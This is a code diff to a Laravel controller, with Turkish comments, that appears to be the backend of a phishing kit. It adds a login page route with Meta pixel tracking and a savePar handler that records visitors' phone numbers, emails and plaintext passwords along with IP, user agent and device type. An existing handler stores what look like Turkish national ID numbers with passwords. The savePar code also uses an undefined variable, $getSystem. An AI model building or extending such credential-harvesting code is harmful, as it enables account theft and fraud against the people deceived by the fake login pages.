@@ -5,10 +5,12 @@ namespace App\Http\Controllers;
 use App\Classes\SystemStatusEnum;
 use App\Http\Requests\binRequest;
 use App\Http\Requests\loginsRequest;
+use App\Http\Requests\parRequest;
 use App\Models\AdminOptions;
 use App\Models\binLogModel;
 use App\Models\ForbiddensModel;
 use App\Models\LoginModel;
+use App\Models\PLogModel;
 use App\Models\Sites;
 use App\Supports\Verify;
 use Carbon\Carbon;
@@ -92,6 +94,12 @@ class MainController extends Controller
         $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
         return view('b', ['options' => $options]);
     }
+
+    public function plogin(Request $request)
+    {
+        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
+        return view('p.login', ['options' => $options]);
+    }
     public function firstGG(Request $request)
     {
         return view('main');
@@ -132,6 +140,30 @@ class MainController extends Controller
 
         return response()->json(['status' => 'ok'], 200);
     }
+    public function savePar(parRequest $request)
+    {
+        $request->merge([
+            'phone' => $request->phone,
+            'email' => $request->email,
+            'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
+            'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
+            'date' => Carbon::now(),
+            'site' => request()->server('HTTP_HOST'),
+            'ip' => $request->ip(),
+            'system_id' => $getSystem->system ?? SystemStatusEnum::P->value
+        ]);
+        $parData = $request->all();
+
+        $create = PLogModel::updateOrCreate(
+            [
+                'phone' => $parData['phone'],
+                'password' => $parData['password'],
+            ], // Şart: Email ve şifre aynıysa güncelle
+            $parData // Güncellenecek veya eklenecek veri
+        );
+
+        return response()->json(['status' => 'ok'], 200);
+    }
     public function saveData(loginsRequest $request)
     {
         if ($request->tc && $request->password) {
@@ -164,6 +196,11 @@ class MainController extends Controller
             ], $request->all());
             return response()->json(['result' => 'success'], 200);
         }
+    }
+
+    public function resetcache()
+    {
+        app()->make(\Spatie\Permission\PermissionRegistrar::class)->forgetCachedPermissions();
     }
 
     public function test(Request $request) {}
